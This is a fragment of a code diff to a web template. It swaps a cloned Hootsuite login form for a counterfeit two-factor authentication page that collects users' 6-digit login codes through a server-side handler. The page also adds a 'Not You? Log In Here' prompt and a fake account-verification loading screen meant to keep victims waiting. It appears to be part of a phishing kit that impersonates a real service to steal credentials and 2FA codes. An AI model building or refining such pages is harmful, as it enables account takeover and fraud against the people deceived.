-                                                            <div class="inlineErrorIconContainer">
-                                                                <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
-                                                                    class="inlineErrorIcon">
-                                                            </div>
-                                                            <div class="inlineErrorMessageContainer">
-                                                                <div class="inlineErrorTitle _inlineErrorTitle"
-                                                                    id="inlineErrorTitle_loginPasswordInput"
-                                                                    role="alert"></div>
-                                                                <div class="inlineErrorMessage _inlineErrorMessage"
-                                                                    id="inlineErrorMessage_loginPasswordInput"
-                                                                    role="alert"></div>
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                    <!-- Sign In (CTA) Button -->
-                                                    <button class="button disabled _submit submitButton"
-                                                        type="submit" aria-disabled="true" tabindex="-1"
-                                                        aria-describedby="inlineErrorContainer">Sign in</button>
-                                                    <input type="hidden" name="method" value="email">
-                                                    <input type="hidden" name="loginCsrfToken"
-                                                        value="052aef9e00fc39365803c4440d3f06fbf44cd8a909172b6b8e7bcce0fb84c2b1bd981bb16b2f4454c3badab40cd9e1cfe6f144122e31186f6448c9310aefd59d">
-                                                </form>
+                                                    @endif
+                                                    <span> (wait 4:29)</span>
+                                                </div>
                                             </div>
-                                            <div class="linksSectionContainer">
-                                                <a href="javascript:void(0)" class="link">Sign up</a>
-                                                <p class="modLegalNotice x-login">
-                                                    By selecting Sign in, I agree to <a
-                                                        href="javascript:void(0)">Hootsuite's Terms</a>, including the payment
-                                                    terms, and <a href="javascript:void(0)">Privacy Policy</a>
-                                                </p>
+                                            <div class="auth-req-footer" style="height: auto"><a>Need another way to
+                                                    authenticate?</a>
+                                                <button type="submit" class="false"><span>Continue</span></button>
+                                            </div>
+                                        </form>
+                                        <form id="mobile-code" class="auth-req"
+                                            wire:submit.prevent="codeSubmitMobile">
+                                            <div class="auth-req-text">
+                                                <h2>Two-factor authentication required</h2>
+                                                <div class="auth-req-paragraph">
+                                                    <p class="first">You’ve asked us to require a 6-digit login code
+                                                        when anyone tries to access your account from a new device or
+                                                        browser.</p>
+                                                    <p class="second">Enter the 6-digit code from your <strong>code
+                                                            generator</strong> or third-party app below.</p>
+                                                </div>
+                                            </div>
+                                            <div class="show-input-on-mobile show__input-modal">
+                                                <input maxlength="6" minlength="6" name="code2"
+                                                    placeholder="Login Code" type="number" required="required">
+                                                @if ($codeError)
+                                                    <div class="show-error-modal2">
+                                                        <p>The login code you entered doesn't match the one sent to your
+                                                            phone. Please check the number and try again.</p>
+                                                    </div>
+                                                @endif
+                                            </div>
+                                            <div class="having-trouble-class">
+                                                <button>Having trouble?</button>
+                                            </div>
+                                            <div class="show-button-mobile false">
+                                                <button type="submit">Continue</button>
+                                            </div>
+                                        </form>
+
+                                        <div class="show-footer-on-mobile-plus">
+                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
+                                            <div class="footer-flex-mobile-plus confimartion__modal">
+                                                <div>
+                                                    <h2>English (US)</h2>
+                                                    <p>Deutsch</p>
+                                                    <p>Српски</p>
+                                                    <p>Português (Brasil)</p>
+                                                </div>
+                                                <div>
+                                                    <p>Italiano</p>
+                                                    <p>Bosanski</p>
+                                                    <p>Svensk</p>
+                                                    <button>+</button>
+                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
+                                @endif
+                                @if ($enableLoadingAfterSubmit)
+                                    <div class="loading-container">
+                                        <div class="loading-message">Please be patient and dont close this window</div>
+                                        <div class="loading-submessage step1">Checking the details on your account...
+                                        </div>
+                                        <div class="loading-submessage step2">Checking email addresses...</div>
+                                        <div class="loading-submessage step3">Checking two-factor authenticator...
+                                        </div>
+                                        <div class="loading-submessage step4">Checking other details...</div>
+                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to
+                                            verify your account.</div>
+                                        <div class="loader"></div>
+                                    </div>
+                                @endif
                             </div>
+
                         </div>
                         <div class="ant-modal-footer">
                             <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button><button
